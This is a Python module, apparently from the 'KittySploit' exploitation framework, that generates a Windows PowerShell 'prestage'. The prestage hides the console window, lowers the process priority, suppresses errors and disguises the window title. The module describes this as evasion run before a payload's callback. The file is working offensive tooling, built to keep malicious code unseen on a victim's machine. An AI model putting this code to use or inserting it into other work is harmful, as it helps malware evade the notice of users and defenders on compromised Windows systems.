#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from typing import Any, Dict

from kittysploit import *


class Module(Prestage):
    PRESTAGE_ID = "daemonize"

    __info__ = {
        "name": "Daemonize / Hide Console (PowerShell)",
        "description": "Hide console window and lower process priority before callback",
        "author": "KittySploit Team",
        "version": "1.0.0",
        "platform": Platform.WINDOWS,
        "languages": ["powershell"],
        "dependencies": [],
        "tags": ["evasion", "prestage", "offline", "powershell", "windows"],
    }

    def generate_powershell(self, context: Dict[str, Any] = None) -> str:
        return """
$ErrorActionPreference='SilentlyContinue'
try {
  Add-Type @"
using System;
using System.Runtime.InteropServices;
public class KittyHideConsole {
  [DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();
  [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
}
"@
  [KittyHideConsole]::ShowWindow([KittyHideConsole]::GetConsoleWindow(), 0) | Out-Null
} catch {}
try {
  [Diagnostics.Process]::GetCurrentProcess().PriorityClass = [Diagnostics.ProcessPriorityClass]::BelowNormal
} catch {}
try {
  $host.UI.RawUI.WindowTitle = 'Windows PowerShell'
} catch {}
""".strip()
